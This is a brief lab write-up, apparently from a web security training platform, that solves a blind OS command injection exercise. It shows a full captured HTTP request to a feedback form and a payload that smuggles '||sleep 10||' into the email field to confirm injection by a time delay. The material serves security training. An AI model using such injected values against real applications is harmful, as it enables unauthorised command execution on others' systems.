## Lab: Blind OS command injection with time delays

Description:

- This lab contains a blind OS command injection vulnerability in the feedback function.

- The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

- To solve the lab, exploit the blind OS command injection vulnerability to cause a `10` second delay.  

```
POST /feedback/submit HTTP/2
Host: 0a4f005104c1d67f87c79ec5003a00b7.web-security-academy.net
Cookie: session=VfG5kvqsIxucwU8SvqW2oPe20TKXNTAX
Sec-Ch-Ua: "Not_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4f005104c1d67f87c79ec5003a00b7.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

csrf=0zQ9NjiKVdhlHj4OpgVMoX5ti1vUEou0&name=test&email=test@morganstanley.de||sleep+10||&subject=test&message=test
```

Manual Payload:

```
email=test@morganstanley.de||sleep+10||
```